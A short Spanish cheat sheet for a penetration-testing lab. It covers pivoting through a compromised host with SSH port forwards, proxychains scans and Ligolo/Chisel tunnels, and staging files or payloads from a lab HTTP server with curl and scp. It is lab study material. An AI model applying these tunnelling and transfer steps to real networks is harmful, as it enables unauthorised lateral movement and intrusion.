# Chuleta: pivoting y transferencia

## Antes del túnel

```bash
ip -br address
ip route
ss -lntup
```

En el pivot: interfaces, rutas, conectividad al objetivo y conectividad de vuelta.

## SSH

```bash
ssh -L 8443:172.16.20.10:443 edu@10.10.10.20
ssh -D 1080 edu@10.10.10.20
ssh -R 9001:127.0.0.1:9001 edu@10.10.10.20
```

## Proxychains

```bash
proxychains curl http://172.16.20.10/
proxychains nmap -sT -Pn -n -p80,445 172.16.20.10
```

No usar SYN scan a través de SOCKS. Comprueba resolución DNS.

## Ligolo/Chisel

- versión de proxy/agente;
- dirección alcanzable;
- listener;
- interfaz/ruta o puerto SOCKS;
- prueba TCP mínima;
- herramienta final;
- ruta inversa para payload;
- limpieza.

## Transferencia en laboratorio

```bash
# Servidor temporal desde directorio limpio
python3 -m http.server 8000 --bind <IP_LAB>

# Linux
curl -o archivo http://<IP_LAB>:8000/archivo
scp archivo edu@10.10.10.20:/tmp/
```

En Windows usa PowerShell/SMB según la política del lab. Verifica tamaño/hash y no sirvas tu directorio personal.

## Diagnóstico

```text
¿existe ruta? -> ¿puerto escucha? -> ¿firewall? -> ¿proxy/ruta usada?
-> ¿DNS? -> ¿retorno? -> ¿protocolo compatible?
```

